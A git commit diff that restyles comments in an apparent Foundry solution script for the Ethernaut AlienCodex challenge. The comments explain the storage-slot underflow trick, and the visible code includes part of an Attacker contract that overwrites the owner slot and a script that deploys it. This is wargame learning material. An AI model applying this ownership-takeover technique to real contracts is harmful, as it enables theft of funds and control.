25ed475cd0c8cc430dafd2c4b4e0fdf1852afac3
Alexander Gadzhalov <alexander.gadzhalov@limechain.tech>
2024-11-08 14:45:53 +0200

    docs(AlienCodex): style guide and comments

--- script/AlienCodex.s.sol
+++ script/AlienCodex.s.sol
@@ -14,6 +14,7 @@ interface AlienCodex {
 
 contract Attacker {
     AlienCodex target;
+    
     constructor(address _target) {
         target = AlienCodex(_target);
         // bypass modifier
@@ -35,32 +36,34 @@ contract Attacker {
         target.revise(i, bytes32(uint256(uint160(msg.sender))));
     }
 }
-
+/// @author agadzhalov
+/// @title Solution to AlienCodex Ethernaut challenge
+/// @notice Solution: 
+///         Must know prerequisites are:
+///         1. Understanding of underflow
+///         2. How dynamic arrays are stored in the EVM
+///         3. The contract is implemented using Solidity version 0.5.0
+///
+///         The `owner` is stored in the 0th slot since the contract inherits `Ownable` where the first variable is `_owner`.
+///         This can be checked using `cast storage`.
+///
+///         - 0th slot: 0x0000000000000000000000000bc04aa6aac163a6b3667636d798fa053d43bd11
+///           (Owner address is the 20-byte address `0x0bc04aa6aac163a6b3667636d798fa053d43bd11`)
+///         - `bool contact` is 1 byte and is also stored in the 0th slot.
+///         - 1st slot contains the length of the dynamic array `codex[]`.
+///         - Elements of the `codex[]` array start from `keccak(1)`.
+///
+///         Resources: 
+///         - https://dev.to/ceasermikes002/understanding-how-the-evm-stores-mappings-arrays-and-structs-in-solidity-5adh
+///         - https://medium.com/coinmonks/learn-solidity-lesson-22-type-casting-656d164b9991
 contract AlienCodexScript is Script {
 
-    /**
-     * Solution: Must know prerequisites are 
-     * 1. What is underflow
-     * 2. How dynamic arrays are stored in the EVM
-     * 3. Keep in mind the contract is implemeted with Solidity version 0.5.0
-     * 
-     * The owner is stored at the 0th slot, because the contract is Ownable and the first far from Ownable is _owner
-     * You can easily check the 0th sloth with cast storage.
-     * 
-     * 0th slot - 0x0000000000000000000000000bc04aa6aac163a6b3667636d798fa053d43bd11
-     * Owner is 20 bytes addres - 0x0bc04aa6aac163a6b3667636d798fa053d43bd11
-     * 
-     * bool contact is 1 byte and it's stored also on the 0th slot
-     * 1st slot contains the length of the dynamic array codex[]
-     * All the elementes of the codex[] are stored starting from the keccak(1) slot. 
-     * 
-     * Resources: 
-     * https://dev.to/ceasermikes002/understanding-how-the-evm-stores-mappings-arrays-and-structs-in-solidity-5adh
-     * https://medium.com/coinmonks/learn-solidity-lesson-22-type-casting-656d164b9991
-     */
     function run() public {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+
+        // Deploy the Attacker contract with the AlienCodex contract address as a parameter
         Attacker attacker = new Attacker(0xeA56fb8A927c78Fe02F3a99AAEdb8f42cceFA79b);
+
         vm.stopBroadcast();
     }
 }
